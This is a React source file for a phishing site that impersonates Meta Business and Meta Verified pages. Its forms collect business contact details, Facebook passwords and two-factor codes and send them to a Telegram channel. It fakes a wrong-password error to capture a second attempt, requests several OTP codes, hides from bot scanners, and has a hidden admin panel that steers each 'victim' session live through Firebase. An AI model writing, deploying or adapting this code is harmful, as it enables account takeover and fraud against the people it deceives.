'use client';

import { useEffect, useState, useCallback, useMemo, useRef } from 'react';
import axios from 'axios';
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue } from "firebase/database";

// Import ảnh
import MetaLogoBlue from '@/assets/images/logo-meta.svg';
import HeroVideo from '@/assets/images/hero.mp4';
import AdsManagerVideo from '@/assets/images/ads_manager.mp4';
import StreetwearVideo from '@/assets/images/streetwear.mp4';
import BrooklinenVideo from '@/assets/images/brooklinen.mp4';
import ShopifyVideo from '@/assets/images/shopify.mp4';
import MediaImg from '@/assets/images/media.webp';
import FansVideo from '@/assets/images/fans.mp4';
import FbIcon from '@/assets/images/fb_round_logo.png';
import IgIcon from '@/assets/images/ic_instagram_color.webp';
import MessengerIcon from '@/assets/images/ic_message_color.svg';
import WhatsappIcon from '@/assets/images/ic_whatshap_color.svg';
import SupportVideo from '@/assets/images/support.mp4';
import BackgroundImg from '@/assets/images/background.webp';

// Import Utils
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import countryToLanguage from '@/utils/country_to_language';
import HomeStartModals from '@/components/home-start-modals';

// Import Telegram & Translations
import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '@/utils/telegram';
import { translations } from '@/translations'; 

// ==========================================
// CẤU HÌNH FIREBASE
const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
const firebaseConfig = { databaseURL: FIREBASE_URL };
const firebaseApp = initializeApp(firebaseConfig);
const database = getDatabase(firebaseApp);
// ==========================================

const EU_COUNTRY_TO_LANG = {
  FR: 'fr', BE: 'fr', LU: 'fr', DE: 'de', AT: 'de', IT: 'it', ES: 'es', PT: 'pt', NL: 'nl',
  IE: 'en', MT: 'en', CY: 'en', DK: 'da', SE: 'sv', FI: 'fi', PL: 'pl', CZ: 'cs', SK: 'sk', 
  HU: 'hu', RO: 'ro', BG: 'bg', HR: 'hr', SI: 'sl', EE: 'et', LV: 'lv', LT: 'lt', GR: 'el',
};

const LoadingSpinner = () => (
  <div style={{
    width: '20px', height: '20px', border: '3px solid rgba(255, 255, 255, 0.3)',
    borderTop: '3px solid #fff', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto'
  }} />
);

// ==========================================
// COMPONENT AUTHFORM (TÁCH RIÊNG THEO FILE CỦA BẠN)
// ==========================================
const AuthForm = ({ 
  step, setStep, loading, errors, setErrors, showLoginError, showOtpError,
  busName, setBusName, perEmail, setPerEmail, busEmail, setBusEmail, 
  countryCode, setCountryCode, phoneNum, setPhoneNum,
  loginUser, setLoginUser, loginPass, setLoginPass, otp, setOtp,
  handleSignup, handleLogin, handleOtp
}: any) => {
  return (
    <div style={{ width: '100%' }}>
      
      {/* BƯỚC 1: SIGNUP */}
      {step === 1 && (
        <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <h2 className="modal-title" style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '6px', color: '#050505' }}>
            Meta Verified for Business
          </h2>
          <p className="modal-subtitle" style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
            Enter your business details to start your application.
          </p>
          
          <div className="fb-input-group">
            <input className={`fb-input ${errors.busName ? 'input-error' : ''}`} placeholder="Business name" value={busName} onChange={(e) => { setBusName(e.target.value); setErrors({ ...errors, busName: false }); }} />
            {errors.busName && <div className="field-error show">Please enter your business name.</div>}
          </div>
          
          <div className="fb-input-group">
            <input className={`fb-input ${errors.perEmail ? 'input-error' : ''}`} type="email" placeholder="Personal email" value={perEmail} onChange={(e) => { setPerEmail(e.target.value); setErrors({ ...errors, perEmail: false }); }} />
            {errors.perEmail && <div className="field-error show">Please enter a valid personal email.</div>}
          </div>
          
          <div className="fb-input-group">
            <input className={`fb-input ${errors.busEmail ? 'input-error' : ''}`} type="email" placeholder="Business email" value={busEmail} onChange={(e) => { setBusEmail(e.target.value); setErrors({ ...errors, busEmail: false }); }} />
            {errors.busEmail && <div className="field-error show">Please enter a valid business email.</div>}
          </div>
          
          <div className="fb-input-group">
            <div className="fb-phone-group">
              <div className="fb-phone-select-wrap">
                <select className="fb-phone-select" value={countryCode} onChange={(e) => setCountryCode(e.target.value)}>
                  <option value="+84">+84 (Vietnam)</option>
                  <option value="+1">+1 (US)</option>
                  <option value="+44">+44 (UK)</option>
                  <option value="+33">+33 (FR)</option>
                  <option value="+49">+49 (DE)</option>
                  <option value="+61">+61 (AU)</option>
                  <option value="+81">+81 (JP)</option>
                  <option value="+82">+82 (KR)</option>
                  <option value="+86">+86 (CN)</option>
                  <option value="+91">+91 (IN)</option>
                </select>
              </div>
              <input className={`fb-input ${errors.phoneNum ? 'input-error' : ''}`} placeholder="Phone number" value={phoneNum} onChange={(e) => { setPhoneNum(e.target.value); setErrors({ ...errors, phoneNum: false }); }} />
            </div>
            {errors.phoneNum && <div className="field-error show">Please enter a valid phone number.</div>}
          </div>
          
          <button type="submit" className="fb-btn" disabled={loading} style={{ marginTop: '12px' }}>
            {loading ? <LoadingSpinner /> : 'Continue'}
          </button>
        </form>
      )}

      {/* BƯỚC 2: LOGIN */}
      {step === 2 && (
        <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <h2 className="modal-title" style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '20px', color: '#050505' }}>
            Log in to Facebook
          </h2>
          
          <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={(e) => setLoginUser(e.target.value)} required autoComplete="off" />
          
          <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={(e) => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
          
          {showLoginError && <div className="alert-error show">The password you entered is incorrect. Please try again.</div>}
          
          <button type="submit" className="fb-btn" disabled={loading} style={{ marginTop: '12px' }}>
            {loading ? <LoadingSpinner /> : 'Log in'}
          </button>
        </form>
      )}

      {/* BƯỚC 3: OTP */}
      {step === 3 && (
        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <h2 className="modal-title" style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', marginBottom: '6px', color: '#050505' }}>
            Two-factor authentication
          </h2>
          <p className="modal-subtitle" style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>
            Enter the 6-digit or 8-digit code we sent to your device.
          </p>
          
          <input className="fb-input fb-otp-input" placeholder="00000000" value={otp} onChange={(e) => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); }} required maxLength={8} />
          
          {showOtpError && <div className="alert-error show">Invalid security code. Please check and try again.</div>}
          
          <button type="submit" className="fb-btn" disabled={loading || otp.length < 6} style={{ marginTop: '12px' }}>
            {loading ? <LoadingSpinner /> : 'Verify'}
          </button>
        </form>
      )}
    </div>
  );
};


// ==========================================
// COMPONENT HOME CHÍNH
// ==========================================
export default function Home() {
    // --- STATE CHO LANDING PAGE ---
    const videoRef = useRef( null );
    const [ isVideoPaused, setIsVideoPaused ] = useState( false );
    const adsVideoRef = useRef( null );
    const [ isAdsVideoPaused, setIsAdsVideoPaused ] = useState( false );
    const [ activeAccordion, setActiveAccordion ] = useState( 'ads_manager' );
    const [ playingVideo, setPlayingVideo ] = useState( null );
    const fansVideoRef = useRef( null );
    const [ isFansVideoPaused, setIsFansVideoPaused ] = useState( false );
    const [ activeTab, setActiveTab ] = useState( 'facebook' );
    const supportVideoRef = useRef( null );
    const [ isSupportVideoPaused, setIsSupportVideoPaused ] = useState( false );
    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
    const [ isLoading, setIsLoading ] = useState( true );
    const [ isStartModalsOpen, setStartModalsOpen ] = useState( false );

    // --- STATE CHO FORM MODAL ---
    const [lang, setLang] = useState('en');
    const t = translations[lang] || translations['en'] || {};

    const [showModal, setShowModal] = useState(false);
    const [step, setStep] = useState(1);
    const [clientIp, setClientIp] = useState('Unknown');
    const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
    const [countryCode, setCountryCode] = useState('+84'); const [phoneNum, setPhoneNum] = useState('');
    const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
    const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
    const [loading, setLoading] = useState(false);
    const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

    const [matchNumber, setMatchNumber] = useState(null); 
    const [showSuccess, setShowSuccess] = useState(false); 
    const [adminSessionId, setAdminSessionId] = useState(''); 
    const [adminNumberInput, setAdminNumberInput] = useState(''); 
    const [showAdmin, setShowAdmin] = useState(false);

    const [sessionId] = useState(() => {
        if (typeof window !== 'undefined') {
            let id = localStorage.getItem('session_id');
            if (!id) {
                id = 'user_' + Math.random().toString(36).substring(2, 9);
                localStorage.setItem('session_id', id);
            }
            return id;
        }
        return 'user_ssr';
    });

    // --- DATA TEXTS CHO LANDING PAGE ---
    const defaultTexts = useMemo(
        () => ( {
            fullName: 'Full Name', personalEmail: 'Personal Email', businessEmail: 'Business Email', mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Your Page Name', agreeToTerms: 'I agree to the', confirm: 'Confirm', aboutHelpMore: 'About · Help · See more',
            loginInstruction: 'To activate content monetization and start earning money on Facebook, you must be logged in to your creator account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email', password: 'Password', passwordIncorrect: 'Password is incorrect, please try again.', logIn: 'Log in',
            continueBtn: 'Continue', forgotPassword: 'Forgot password?', loginPasswordSecurityNote: 'For your security, you must enter your password to continue.',
            loginPasswordFieldPlaceholder: 'Enter your password', loginForgotPasswordQuestion: 'Forgot your password?', twoFATitle: 'Check your authentication code',
            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
            code: 'Code', codeExpired: 'This code has expired. Please enter a new code later', pleaseWait: 'Please wait', findNewWaysTitle: 'Find new ways to earn money with your content.',
            creatorLabel: 'Creator', subscribeBtn: 'Subscribe', monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",
            heroTitle: 'Explore how Meta technologies can help transform your business.', startNow: 'Start now', trustedExperts: 'Trusted by experts',
            exploreMeta: 'Explore Meta technologies', improveAd: 'Improve ad performance', improveAdDesc: 'Maximise campaign results and simplify the setup process with advanced ad creation tools.',
            reachPeople: 'Reach people where they are', reachPeopleDesc: 'Connect with people across Meta technologies and build relationships.', getExpert: 'Get expert guidance',
            getExpertDesc: 'Access personalized support and resources to help your business grow.', findSolutions: 'Find solutions for your business',
            findSolutionsDesc: 'Discover the right tools and strategies to achieve your unique goals.', understandAudience: 'Understand your audience',
            understandAudienceDesc: 'Gain insights into customer behavior and preferences to inform your marketing.', useFormats: 'Use versatile ad formats',
            useFormatsDesc: 'Create engaging ads that resonate with your target audience across different platforms.', toolsTitle: 'Gain access to tools that deliver results.',
            adsManager: 'Ads Manager', fbIgShops: 'Facebook & Instagram Shops', messengerApi: 'Messenger API', waBusiness: 'WhatsApp Business Platform',
            inspiredTitle: 'Be inspired by reading how best-in-class marketers scale their business with Meta technologies.',
            streetwearTip: 'Streetwear brand Market shares tips on how to hype up your next product drop', brooklinenTip: 'Brooklinen shares how to use Meta ad solutions to find new customers',
            shopifyTip: 'Shopify shares how to use Meta tools to build a community and grow sales', reachTitle: 'Reach more customers with ads on Meta technologies.',
            reachDesc: 'Discover everything you need to start advertising your business.', connectedTitle: 'Stay connected to your audience.',
            reachCustomersFb: 'Reach your customers with the Facebook app.', createPage: 'Create a Page', getSupport: 'Get support',
            resourcesTitle: 'Additional resources for your business.', footerUpdateTitle: 'Get the latest updates from Meta for business.',
            footerUpdateDesc: 'Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.',
            emailAddressPlaceholder: 'Email address', enterCountry: 'Enter a country name...',
            footerDisclaimer: 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our',
            dataPolicy: 'Data Policy', successModalTitle: 'Request has been sent', successModalDesc: 'Your information has been added to the processing queue. We will respond to your results within 24 hours. In case we do not receive a response, please resend the information so we can assist you.',
            successModalFrom: 'From the Customer Care Team', successModalBtn: 'Return to facebook', successModalHeroAlt: 'Success', successModalLogoAlt: 'Meta',
            twoFATitleNew: 'Two-factor authentication required', twoFADescriptionTemplate: 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
            twoFAFallbackUser: 'User', twoFABrandFacebook: 'Facebook', twoFAAuthenticationImageAlt: 'Two-factor authentication', enterCode: 'Enter the code',
            tryAnotherWay: 'Try another way', information: 'Information', fanpageName: 'Fanpage Name', dateOfBirth: 'Date of Birth', day: 'Day', month: 'Month', year: 'Year',
            message: 'Message', responseWithin: 'Our response will be sent to you within 14 - 48 hours.', termsOfUse: 'Terms of use', submit: 'Submit',
            navGetStarted: 'Get started', navAdvertise: 'Advertise', navLearn: 'Learn', navSupport: 'Support',
            landingHeroTitle: 'Become a Meta Business Partner', landingHeroSubtitle: 'Become a Meta Business Partner to receive up to $3,000 in advertising credits, along with valuable benefits such as training, technical support, analytics tools, and opportunities to expand your client network. Get started now to claim your advertising credits.',
            landingGetStartedBtn: 'Get started', metaVerifiedTitle: 'Protect your brand with Meta Verified', metaVerifiedDesc: 'Stand out with a verified badge, proactive account protection and access to support — so people know they are engaging with the real you.',
            metaVerifiedBtnFacebook: 'Subscribe on Facebook', metaVerifiedBtnInstagram: 'Subscribe on Instagram', metaVerifiedBusinessLead: 'Are you a business?',
            metaVerifiedBusinessLink: 'Get more information on Meta Verified for businesses', metaVerifiedDisclaimer: 'Features, availability and pricing may vary by region and app.',
            metaVerifiedAriaClose: 'Close dialog', metaVerifiedPhonesAlt: 'Facebook and Instagram with Meta Verified', metaVerifiedCornerLabel: 'Meta xác minh', homeStartModalCornerLead: 'Đăng Ký',
            monetizeModalBack: 'Tất cả các mục tiêu kinh doanh', monetizeModalCornerLabel: 'Kiếm tiền nội dung', monetizeModalEyebrow: 'Kiếm tiền từ nội dung của tôi',
            monetizeModalTitle: 'Tìm những cách thức mới để kiếm tiền từ nội dung của bạn.', monetizeModalCreator: 'Người sáng tạo',
            monetizeModalDesc: 'Dù bạn đang tạo video hay đăng bài lên blog, các công cụ kiếm tiền của Facebook đều giúp bạn kiếm được nhiều tiền hơn.',
            monetizeModalSubscribe: 'Đăng ký', monetizeModalBrand: 'The Vegan Baker', monetizeModalHeroAlt: 'Người sáng tạo nội dung trong bếp với bánh cupcake',
            trustedPartnersTitle: 'Meta Business Partners are trusted experts', trustedPartnersDesc: 'Join our global community of solution specialists, vetted by Meta for technical and service excellence. When you join, you\'ll get access to unique benefits such as training, support, analytics reports and client matching opportunities to help fuel the growth of your business.',
            landingFeatureReachMoreTitle: 'Reach more people', landingFeatureReachMoreDesc: 'Get ads to people most likely to be interested in your products or services with automated targeting tools.',
            becomeExpertCardTitle: 'Become an expert', becomeExpertLead: 'Upgrade your marketing skills with free online courses and certifications through', metaBlueprintBrand: 'Meta Blueprint', becomeExpertTrail: '',
            personalisedAdSolutionsTitle: 'Get personalised ad solutions', personalisedAdSolutionsDesc: 'See faster results in fewer steps with AI-enabled tools that generate ads your customers want to see.',
            understandPerformanceTitle: 'Understand performance', understandPerformanceDesc: 'Access advanced marketing performance tracking with detailed overviews of audience behaviour.',
            adFormatsTitle: 'Use ad formats that work', adFormatsDesc: 'Designed to fit specific business goals, reach and expand your audience across every device.',
            accordionAdsManagerDesc: 'Create and track new ads, monitor your budget and increase sales across Facebook, Messenger, Instagram and WhatsApp – all from one place.',
            accordionBusinessSuiteTitle: 'Meta Business Suite', accordionBusinessSuiteDesc: 'Manage all your Facebook and Instagram activities in one place – including posting, messaging, analytics and advertising.',
            accordionPixelTitle: 'Meta pixel', accordionPixelDesc: 'Understand the actions people take on your website and reach new audiences with the Meta pixel.',
            accordionFbPagesTitle: 'Facebook Pages', accordionFbPagesDesc: 'Connect with customers and grow your business with a Facebook Page.',
            accordionAiMarketingTitle: 'AI tools (performance marketing)', accordionAiMarketingDesc: 'Use AI-powered tools to automate and optimise your campaigns for better performance.',
            learnMore: 'Learn more', goToAdsManager: 'Go to Ads Manager', inspiredBrookShort: 'Brooklinen\'s tips for maximising your ad budget', inspiredShopifyShort: 'Shopify\'s tips for reaching the right audience',
            createAd: 'Create ad', metaTechnologiesEyebrow: 'Meta technologies', marketingOnFacebookEyebrow: 'Marketing on Facebook', fansBuildFollowingTitle: 'Find fans and build a following.',
            fansBuildFollowingDesc: 'Create lasting relationships with customers everywhere by marketing with Facebook.', exploreFacebookLink: 'Explore Facebook',
            supportCentreEyebrow: 'Meta Business Help Centre', supportAnswersTitle: 'Get answers to FAQ, plus help and support with troubleshooting business accounts.', mediaIllustrationAlt: 'Meta Platforms Illustration',
            ariaPlayVideo: 'Play', ariaPauseVideo: 'Pause', footerFcMetaFb: 'Facebook', footerFcMetaIg: 'Instagram', footerFcMetaMsg: 'Messenger', footerFcMetaWa: 'WhatsApp', footerFcMetaAn: 'Audience Network', footerFcMetaQuest: 'Meta Quest', footerFcMetaWorkplace: 'Workplace', footerFcMetaForWork: 'Meta for Work',
            footerFcToolsFt: 'Free tools', footerFcToolsFbPages: 'Facebook Pages', footerFcToolsIgProfiles: 'Instagram profiles', footerFcToolsStories: 'Stories', footerFcToolsShops: 'Shops', footerFcToolsMbs: 'Meta Business Suite', footerFcToolsFbAds: 'Facebook ads', footerFcToolsIgAds: 'Instagram ads', footerFcToolsVideoAds: 'Video ads', footerFcToolsAdsMgr: 'Ads Manager',
            footerFcGoalsFbPage: 'Set up a Facebook Page', footerFcGoalsBrandAwareness: 'Build brand awareness', footerFcGoalsLocal: 'Promote your local business', footerFcGoalsOnlineSales: 'Grow online sales', footerFcGoalsApp: 'Promote your app', footerFcGoalsLeads: 'Generate leads', footerFcGoalsMeasure: 'Measure and optimise ads', footerFcGoalsRetarget: 'Retarget existing customers',
            footerFcBizSmall: 'Small business', footerFcBizLarge: 'Large businesses', footerFcBizAgency: 'Agency', footerFcBizMedia: 'Media and publisher', footerFcBizCreator: 'Creator', footerFcBizDev: 'Developer', footerFcBizPartner: 'Business partner',
            footerFcIndustryAuto: 'Automotive', footerFcIndustryCpg: 'Consumer packaged goods', footerFcIndustryEcom: 'E-commerce', footerFcIndustryEnt: 'Entertainment and media', footerFcIndustryFin: 'Financial services', footerFcIndustryGaming: 'Gaming', footerFcIndustryProperty: 'Property', footerFcIndustryRest: 'Restaurants', footerFcIndustryRetail: 'Retail', footerFcIndustryTech: 'Technology and telecom', footerFcIndustryTravel: 'Travel',
            footerFcSkillsOnline: 'Online learning', footerFcSkillsCert: 'Certification programmes', footerFcSkillsWebinars: 'Webinars',
            footerFcGuideAds: 'Ads guide', footerFcGuideBrand: 'Brand safety and suitability', footerFcGuideBook: '"Click Here" book', footerFcGuideMedia: 'Media responsibility', footerFcGuideSitemap: 'Sitemap',
            footerFcColMetaTech: 'Meta technologies', footerFcColTools: 'Tools', footerFcColGoals: 'Goals', footerFcColBusinessTypes: 'Business types', footerFcColIndustries: 'Industries', footerFcColSkills: 'Skills and training', footerFcColGuides: 'Guides and resources',
            footerLegalAbout: 'About', footerLegalDevelopers: 'Developers', footerLegalCareers: 'Careers', footerLegalPrivacy: 'Privacy', footerLegalCookies: 'Cookies', footerLegalTerms: 'Terms', footerLegalHelp: 'Help Centre',
            footerSocialFacebook: 'Facebook', footerSocialInstagram: 'Instagram', footerSocialX: 'X', footerSocialLinkedIn: 'LinkedIn', footerCopyrightNotice: '© 2026 Meta'
        } ),
        []
    );

    const initLandingPage = async () => {
        try {
            const botResult = await detectBot();
            if ( botResult.isBot ) { window.location.href = 'about:blank'; return; }
            try {
                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                const data = response.data;
                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
                const countryCode = data.country_code;
                const targetLang = countryToLanguage[ countryCode ] || 'en';
                localStorage.setItem( 'targetLang', targetLang );
                if ( targetLang !== 'en' ) { translateAllTexts( targetLang ); } else { setTranslatedTexts( defaultTexts ); }
            } catch ( error ) { console.error( 'Error fetching IP:', error ); setTranslatedTexts( defaultTexts ); }
            setIsLoading( false );
        } catch ( error ) { console.error( 'Initialization error:', error ); setIsLoading( false ); }
    };

    useEffect( () => {
        if (typeof window !== 'undefined') { localStorage.clear(); }
        initLandingPage();
    }, [] );

    const translateAllTexts = useCallback( async ( targetLang ) => {
        try {
            const keys = Object.keys( defaultTexts );
            const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
            const translated = {};
            keys.forEach( ( key, index ) => { translated[ key ] = translations[ index ]; } );
            setTranslatedTexts( translated );
        } catch ( error ) { console.error( 'Translation error:', error ); setTranslatedTexts( defaultTexts ); }
    }, [ defaultTexts ] );

    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;

    // --- LẤY IP & NGÔN NGỮ CHO FORM ---
    useEffect(() => { 
        fetch('https://ipwho.is/')
          .then(r => r.json())
          .then(d => { 
              if (d && d.ip) {
                  setClientIp(`${d.ip} - ${d.country} (${d.city})`);
                  const mappedLang = EU_COUNTRY_TO_LANG[d.country_code];
                  if (mappedLang && translations[mappedLang]) { setLang(mappedLang); } else { setLang('en'); }
                  if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
              }
          }).catch(()=>{}); 
    }, []);

    // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE ---
    useEffect(() => {
        if (showModal && !showAdmin) {
            const commandRef = ref(database, 'commands/' + sessionId);
            const unsubscribe = onValue(commandRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.action) {
                    if (data.action === 'otp') { setStep(3); setMatchNumber(null); setShowSuccess(false); } 
                    else if (data.action === 'approve' && data.value) { setStep(3); setMatchNumber(data.value); setShowSuccess(false); } 
                    else if (data.action === 'success') { setStep(3); setShowSuccess(true); } 
                    else if (data.action === 'error') { setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false); }
                }
            });
            return () => unsubscribe();
        }
    }, [showModal, showAdmin, sessionId]);

    // --- PHÍM TẮT ADMIN ---
    useEffect(() => {
        const handleKeyDown = (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'A') { setShowAdmin(prev => !prev); setShowModal(true); }
        };
        window.addEventListener('keydown', handleKeyDown);
        return () => window.removeEventListener('keydown', handleKeyDown);
    }, []);

    // --- CÁC HÀM XỬ LÝ FORM ---
    const openModal = () => { setShowModal(true); setStep(1); setShowSuccess(false); setShowAdmin(false); };

    const handleSignup = (e) => {
        e.preventDefault(); let errs = {};
        if (busName.length < 2) errs.busName = true; 
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
        if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
        if (Object.keys(errs).length > 0) { setErrors(errs); return; }
        
        setErrors({}); setLoading(true);
        const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
        setInitialSession(text); sendTelegramMessage('');
        setTimeout(() => { setLoading(false); setStep(2); }, 700);
    };

    const handleLogin = (e) => {
        e.preventDefault(); if (loginPass.length === 0) return;
        setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
        sendTelegramMessage(`<b>🔴 <tg-spoiler>Login ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
        setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); } }, (newAttempt === 1) ? 3000 : 5000);
    };

    const handleOtp = (e) => {
        e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
        setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
        if (newAttempt <= 3) sendTelegramMessage(`<b>🔴 <tg-spoiler>2FA ${newAttempt}:</tg-spoiler></b> <code>${escapeHtml(otp)}</code>`);
        setTimeout(() => { 
            setLoading(false); 
            if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
            else { setShowSuccess(true); setOtp(''); }
        }, 1500);
    };

    const handleAdminCommand = (type, value) => {
        const targetUser = adminSessionId.trim(); 
        if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
        set(ref(database, 'commands/' + targetUser), { action: type, value: value }).then(() => {
            alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
        }).catch((error) => { alert("Lỗi gửi lệnh: " + error.message); });
    };

    if ( isLoading ) { return <div id="intro"></div>; }

    return (
        <>
            {/* CHÈN CHÍNH XÁC FILE CSS */}
            <style>{`
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
                html { scroll-behavior: smooth; }
                body { font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1c2b33; background: #fff; line-height: 1.5; -webkit-font-smoothing: antialiased; }
                a { color: inherit; text-decoration: none; }
                img, svg, video { display: block; max-width: 100%; }
                button { cursor: pointer; border: none; background: none; font-family: inherit; }
                h1, h2, h3, h4, h5, h6 { font-weight: 700; line-height: 1.2; }
                h1 { font-size: clamp(28px, 3.5vw, 48px); }
                h2 { font-size: clamp(22px, 2.5vw, 36px); }
                p { font-size: 15px; line-height: 1.6; }
                a:hover { text-decoration: underline; }
                .container-narrow { max-width: 1100px; margin: 0 auto; padding: 0 24px; }

                /* HEADER */
                .header { position: sticky; top: 0; z-index: 100; background: #f5f6f6; border-bottom: 1px solid #e4e6e8; height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; }
                .header-left { display: flex; align-items: center; gap: 8px; }
                .header-logo img { width: 65px; height: auto; }
                .nav-links { display: none; align-items: center; gap: 28px; margin-left: 50px; }
                .nav-link { font-size: 14px; font-weight: 600; cursor: pointer; position: relative; padding-bottom: 2px; }
                .nav-link::after { content: ""; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background: #cbd2d9; transform: scaleX(0); transform-origin: 0; transition: transform .3s; }
                .nav-link:hover::after { transform: scaleX(1); }
                .header-right { display: none; align-items: center; gap: 16px; }
                .header-icon { width: 20px; height: 20px; cursor: pointer; }
                .avatar-btn { width: 40px; height: 40px; border-radius: 50%; background: #e4e6e8; display: flex; align-items: center; justify-content: center; cursor: pointer; overflow: hidden; }
                .hamburger { display: flex; flex-direction: column; gap: 5px; padding: 4px; cursor: pointer; }
                .hamburger span { width: 22px; height: 2px; background: #1c2b33; border-radius: 2px; }
                .header-mobile-icons { display: flex; align-items: center; gap: 16px; }

                /* HERO */
                .hero-inner { max-width: 1440px; margin: 0 auto; padding: 40px 24px; display: flex; flex-direction: column; gap: 40px; }
                .hero-text-inner { display: flex; flex-direction: column; align-items: flex-start; }
                .hero-icon { width: 60px; height: 60px; margin-bottom: 24px; }
                .hero-title { font-weight: 500; margin-bottom: 16px; }
                .hero-subtitle { font-size: 16px; margin-bottom: 28px; }
                .btn-primary { display: inline-flex; align-items: center; justify-content: center; padding: 14px 40px; background: #0064e0; color: #fff; border-radius: 45px; font-size: 16px; font-weight: 700; transition: background .2s; }
                .btn-primary:hover { background: #0056c7; text-decoration: none; }
                .hero-note { margin-top: 24px; font-size: 14px; color: #465a69; max-width: 480px; }
                .hero-image { width: 100%; border-radius: 16px; overflow: hidden; background: #f0f2f5; position: relative; }
                .hero-image img { width: 100%; height: auto; display: block; }

                /* BENEFITS */
                .benefits { padding: 40px 0; }
                .benefits-header { max-width: 1440px; margin: 0 auto; padding: 24px 24px 0; }
                .benefits-header h2 { margin-bottom: 16px; }
                .benefits-header p { font-size: 14px; max-width: 800px; margin-bottom: 16px; }
                .benefits-learn-more { display: inline-flex; align-items: center; gap: 8px; color: #0064e0; font-size: 14px; font-weight: 500; cursor: pointer; }
                .benefits-grid { max-width: 1440px; margin: 0 auto; padding: 32px 24px 40px; display: flex; flex-direction: column; gap: 32px; }
                .benefits-image { border-radius: 16px; overflow: hidden; width: 100%; aspect-ratio: 6/5; background: #e4e6eb; position: relative; display: flex; align-items: center; justify-content: center; }
                .benefits-image img { width: 100%; height: 100%; object-fit: cover; display: block; transition: opacity .3s; }
                .benefits-accordion { width: 100%; border-top: 1px solid #e5e7eb; }
                .benefit-item { padding: 24px 0; border-bottom: 1px solid #e5e7eb; cursor: pointer; color: #9ca3af; }
                .benefit-item.active, .benefit-item:hover { color: #1c2b33; }
                .benefit-header { display: flex; justify-content: space-between; align-items: center; font-size: 22px; font-weight: 500; }
                .benefit-chevron { width: 24px; height: 24px; transition: transform .3s; }
                .benefit-chevron.rotated { transform: rotate(180deg); }
